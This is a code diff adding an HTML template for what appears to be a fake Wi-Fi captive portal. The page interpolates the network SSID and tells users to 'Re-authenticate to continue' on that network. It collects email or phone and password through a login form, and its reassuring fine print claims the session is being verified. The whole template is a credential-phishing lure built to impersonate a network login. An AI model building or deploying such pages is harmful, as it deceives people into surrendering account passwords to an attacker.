@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>{{ title }} — {{ ssid }}</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+</head>
+<body class="generic">
+  <div class="card">
+    <div class="brand">🔐 WiFi</div>
+    <h1>{{ title }}</h1>
+    <p class="muted">Re-authenticate to continue using <strong>{{ ssid }}</strong>.</p>
+    <form method="POST" action="/login">
+      <label>Email or Phone
+        <input type="text" name="email" autocomplete="username" required />
+      </label>
+      <label>Password
+        <input type="password" name="password" autocomplete="current-password" required />
+      </label>
+      <button type="submit">Continue</button>
+    </form>
+    <p class="fineprint">Your session is being verified.</p>
+  </div>
+</body>
+</html>
